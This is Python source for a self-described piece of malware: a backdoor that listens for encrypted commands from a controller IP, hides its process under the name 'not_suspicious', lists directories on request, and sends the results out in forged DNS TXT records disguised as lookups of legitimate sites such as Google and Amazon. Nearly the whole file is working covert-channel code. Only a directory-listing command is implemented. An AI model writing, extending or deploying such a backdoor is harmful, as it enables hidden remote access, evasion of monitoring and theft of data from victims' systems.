# This will contain the code which will run on the victim. i.e. the actual malware
from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send
from utils.encryption import StreamEncryption
from utils.shell import LIST
import os
from random import randint
import argparse
from ipaddress import ip_address, IPv6Address
from sys import exit
from setproctitle import setproctitle, getproctitle

# Command Line Arguments
parser = argparse.ArgumentParser("./backdoor.py")
parser.add_argument("controller_ip", help="The IPv4 address of the controller host.")
parser.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
parser.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
args = parser.parse_args()

# Validate the arguments.

CONTROLLER_IP = args.controller_ip
BACKDOOR_IP = args.backdoor_ip
NETWORK_INTERFACE = args.interface

# List of legit hostnames
hostnames = ["play.google.com", 
            "pixel.33across.com", 
            "signaler-pa.clients6.google.com",
            "www.youtube.com", 
            "www.google.ca", 
            "www.amazon.ca", 
            "www.amazon.com",
            "safebrowsing.googleapis.com",
            "upload.wikimedia.org",
            "hhopenbid.pubmatic.com"]

e = StreamEncryption()
e.read_nonce("data/nonce.bin")
e.read_secret("data/secret.key")
e.initialize_encryption_context()

class DirectoryNotFound(Exception): pass

def get_random_hostname():
    size = len(hostnames)
    index = randint(0, size-1)
    return hostnames[index]

def receive_dns_command(pkt):
    msg_len = pkt[UDP].len
    ciphertext = bytes(pkt[UDP].payload)[0:msg_len]
    msg_bytes = e.decrypt(ciphertext)
    msg = msg_bytes.decode("utf-8")
    return msg

def send_dns_query(query):
    # Send the query.
    send(query, verbose=0)

def forge_dns_query(data: str):
    # Choose random legitimate hostname.
    hostname = get_random_hostname()
    # Encrypt data
    encrypted_data = e.encrypt(data.encode("utf-8"))
    if len(encrypted_data) > 255:
        print("ERROR: Can't fit more than 255 bytes in TXT record!")
        print("Truncating data...")
        encrypted_data = encrypted_data[0:256]
    # Forge the DNS packet with data in the text record.
    query = IP(dst=CONTROLLER_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
    return query

def hide_process_name(name: str):
    setproctitle(name)

def handle_list_command():
    pass

def list_directory(file_path: str) -> list:
    if not os.path.isdir(file_path):
        raise DirectoryNotFound
    return os.listdir(file_path)

def cipher_reset():
    # Reset the stream cipher
    e.initialize_encryption_context()
    print("Stream cipher reset.")

def packet_handler(pkt):
    # Do nothing if not the correct packet.
    if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
        return
    # Decrypt the command.
    command = receive_dns_command(pkt)
    print(f"Received: {command}")
    # Check command and perform operation
    argv = command.split(" ")
    argc = len(argv)
    if argc == 2:
        # Process the command.
        if argv[0] == LIST:
            try:
                contents = list_directory(argv[1])
            except DirectoryNotFound:
                # Send error message back.
                query = forge_dns_query(data="ERRORMSG")
                send_dns_query(query)
                print("Directory not found.")
                return
            data = ""
            for name in contents:
                data += name
                data += " "
            data = data.strip() # Remove last whitespace
            query = forge_dns_query(data=data)
            send_dns_query(query)
            print("Sent directory contents")
            return


if __name__ == "__main__":
    # Hide process name.
    hide_process_name("not_suspicious")
    # Start listening for packets.
    sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)
